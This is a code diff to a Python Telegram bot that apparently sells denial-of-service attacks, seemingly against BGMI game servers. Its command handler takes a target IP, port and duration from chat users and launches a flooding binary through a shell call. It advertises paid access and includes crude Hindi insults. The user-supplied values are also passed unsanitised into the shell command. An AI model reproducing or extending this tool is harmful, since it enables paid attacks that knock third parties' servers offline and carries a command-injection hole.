@@ -266,16 +266,16 @@ def handle_soul(message):
             TRUST_IP = command[1]
             TRUST_port = int(command[2])  
             time = int(command[3])  
-            if time > 181:
-    response = " अरे क्यों माँ चुदा रहा है जब 180 से ज्यादा का अटैक नही लगता है LAST:- 180 ."
-else:
-    record_command_logs(user_id, '/soul_compiled', TRUST_IP, TRUST_port, time)
-    log_command(user_id, TRUST_IP, TRUST_port, time)
-    start_attack_reply(message, TRUST_IP, TRUST_port, time)
-    full_command = f"./trust {TRUST_IP} {TRUST_port} {time} 1024 900"
-    subprocess.run(full_command, shell=True)
-    response = """ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-
+                        if time > 181:
+                response = " अरे क्यों माँ चुदा रहा है जब 180 से ज्यादा का अटैक नही लगता है LAST:- 180 ."
+            else:
+                record_command_logs(user_id, '/soul_compiled', king, TRUSTPAPA, time)
+                log_command(user_id, king, TRUSTPAPA, time)
+                start_attack_reply(message, king, TRUSTPAPA, time)  
+                full_command = f"./trust {king} {TRUSTPAPA} {time} 1024 900"
+                subprocess.run(full_command, shell=True)
+                response = f"""▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+                
                  ☠️
  ᚘᚘᚘᚘᚘᚘᚘ䷁ᚘᚘᚘᚘᚘᚘᚘᚘ
               💠ᚔ💠 𝙎𝙀𝙍𝙑𝙀𝙍 𝙍𝙀𝙏𝙐𝙍𝙉
@@ -294,11 +294,12 @@ else:
 𝐶𝑂𝑁𝑇𝐴𝐶𝑇 𝐹𝑂𝑅 𝐵𝑈𝑌:- 🛸
  ᚔᚔᚔ @TRUSTVIP_MOD ᚔᚔᚔ
  """
-elif time < 0:
-    response = "✅𝗧𝗥𝗬 𝗧𝗛𝗜𝗦✅ :- /bgmi <TRUST_IP> <TRUST_port> <time>"
-else:
-    response = " ⚠️ 𝗖𝗛𝗟 𝗕𝗢𝗢𝗦𝗗𝗜𝗞𝗘 𝗙𝗜𝗥𝗦𝗧 𝗨𝗦𝗘 𝗖𝗢𝗡𝗗𝗢𝗠 𝗕𝗨𝗬 @TRUSTVIP_MOD."
-bot.reply_to(message, response)
+        else:
+            response = "✅𝗧𝗥𝗬 𝗧𝗛𝗜𝗦✅ :- /bgmi <king> <TRUSTPAPA> <time>"  
+    else:
+        response = " ⚠️ 𝗖𝗛𝗟 𝗕𝗢𝗢𝗦𝗗𝗜𝗞𝗘 𝗙𝗜𝗥𝗦𝗧 𝗨𝗦𝗘 𝗖𝗢𝗡𝗗𝗢𝗠  𝗕𝗨𝗬 @TRUSTVIP_MOD."
+
+    bot.reply_to(message, response)
 
 
 
